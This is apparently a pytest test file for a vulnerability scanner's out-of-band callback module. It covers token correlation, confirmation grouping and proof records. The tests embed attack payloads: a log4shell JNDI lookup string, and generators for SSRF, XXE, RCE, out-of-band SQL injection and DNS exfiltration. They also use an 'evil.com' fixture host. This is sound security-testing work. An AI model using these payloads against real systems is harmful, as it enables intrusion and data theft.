"""Tests for core.oast — token minting, correlation, payloads, proof adapter."""

import itertools

import pytest

from core.oast import payloads as P
from core.oast.backend import HttpPollBackend, InMemoryBackend
from core.oast.client import OastClient
from core.oast.interaction import Interaction, PROTO_DNS, PROTO_HTTP
from core.oast.outcome import vuln_record
from core.webgraph import model as M
from core.webgraph.builder import build_graph


def _seq_tokens():
    counter = itertools.count(1)
    return lambda: f"tok{next(counter)}"


def test_new_interaction_builds_host_and_maps_finding():
    client = OastClient(InMemoryBackend("oast.test"), token_gen=_seq_tokens())
    c = client.new_interaction(finding_id="ssrf-1")
    assert c.host == "tok1.oast.test"
    assert c.url == "http://tok1.oast.test/"
    assert client.finding_for("tok1") == "ssrf-1"


def test_poll_correlates_dns_and_http_hits_drops_unknown():
    backend = InMemoryBackend("oast.test")
    client = OastClient(backend, token_gen=_seq_tokens())
    c = client.new_interaction(finding_id="rce-1")   # tok1
    backend.record(Interaction(token="tok1", protocol=PROTO_DNS, host=c.host))
    backend.record(Interaction(token="", protocol=PROTO_HTTP,
                               host="someoneelse.evil.com"))   # unknown -> dropped
    hits = client.poll()
    assert len(hits) == 1 and hits[0].protocol == PROTO_DNS


def test_token_recovered_from_host_when_backend_omits_it():
    backend = InMemoryBackend("oast.test")
    client = OastClient(backend, token_gen=_seq_tokens())
    c = client.new_interaction(finding_id="xxe-1")   # tok1
    # DNS-exfil style: data prepended as a sub-label; token label still present
    backend.record(Interaction(token="", protocol=PROTO_DNS,
                               host=f"leaked-secret.{c.host}"))
    hits = client.poll()
    assert len(hits) == 1 and hits[0].token == "tok1"


def test_confirmations_group_by_finding():
    backend = InMemoryBackend("oast.test")
    client = OastClient(backend, token_gen=_seq_tokens())
    a = client.new_interaction(finding_id="ssrf-A")   # tok1
    b = client.new_interaction(finding_id="ssrf-B")   # tok2
    backend.record(Interaction(token="tok1", protocol=PROTO_HTTP, host=a.host))
    backend.record(Interaction(token="tok2", protocol=PROTO_DNS, host=b.host))
    grouped = client.confirmations()
    assert set(grouped) == {"ssrf-A", "ssrf-B"}


def test_payloads_embed_callback_host():
    host = "tok1.oast.test"
    assert P.ssrf_urls(host)[0] == f"http://{host}/"
    assert host in P.xxe(host)
    assert any(host in cmd for cmd in P.rce_commands(host))
    assert host in P.sqli_oob(host)["mssql"]
    assert P.dns_exfil(host, "sec ret!").startswith("secret.")   # sanitised label
    assert P.log4shell(host) == f"${{jndi:ldap://{host}/a}}"


def test_outcome_builds_confirmed_proof_and_feeds_graph():
    hits = [Interaction(token="tok1", protocol=PROTO_DNS, host="tok1.oast.test",
                        remote_addr="10.0.0.9")]
    row = vuln_record(hits, vuln_id="OAST-1", vuln_class="blind_ssrf",
                      endpoint_id="POST /fetch", owasp="API7")
    assert row["status"] == M.STATUS_CONFIRMED
    assert row["proof_kind"] == M.PROOF_OAST_CALLBACK
    g = build_graph({M.VulnRecord.KIND: [row]})
    assert ("vuln", "OAST-1") in g.nodes
    assert (("endpoint", "POST /fetch"), ("vuln", "OAST-1"),
            M.REL_VULNERABLE_TO) in g.edges


def test_outcome_refuses_empty_interactions():
    with pytest.raises(ValueError):
        vuln_record([], vuln_id="X", vuln_class="blind_ssrf", endpoint_id="GET /a")


def test_http_poll_backend_parses_collector_json():
    class _Client:
        def get_json(self, url, retries=0):
            assert "token=tok1" in url
            return {"interactions": [
                {"protocol": "http", "host": "tok1.oast.test",
                 "remote-address": "1.2.3.4", "timestamp": "2026-01-01T00:00:00Z"}
            ]}

    backend = HttpPollBackend("oast.test", "https://collector/poll", _Client())
    hits = backend.poll(["tok1"])
    assert len(hits) == 1 and hits[0].remote_addr == "1.2.3.4"
